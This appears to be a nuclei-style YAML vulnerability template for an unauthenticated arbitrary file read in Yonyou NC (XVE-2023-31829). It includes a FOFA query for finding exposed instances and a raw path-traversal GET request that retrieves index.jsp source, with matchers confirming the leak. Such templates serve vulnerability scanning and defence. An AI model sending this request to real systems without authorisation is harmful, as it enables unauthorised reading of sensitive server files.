id: yongyouNC-download-File-reading-XVE-2023-31829

info:
  tags: yongyouNC-download-File-reading-XVE-2023-31829
  name: 用友NC download 任意文件读取(XVE-2023-31829)
  author: xc
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
    用友NC printBill 接口处存在任意文件读取，未经身份验证的远程攻击者可利用该漏洞读取系统敏感文件。使系统处于极不安全的状态。



http:
  - raw:
      - |
        GET /portal/pt/xml/file/download?pageId=login&filename=..\index.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'request.getSession(true)'
          - 'response.addHeader("Cache-Control", "no-store")'
        condition: and
      - type: status
        status: 
          - 200





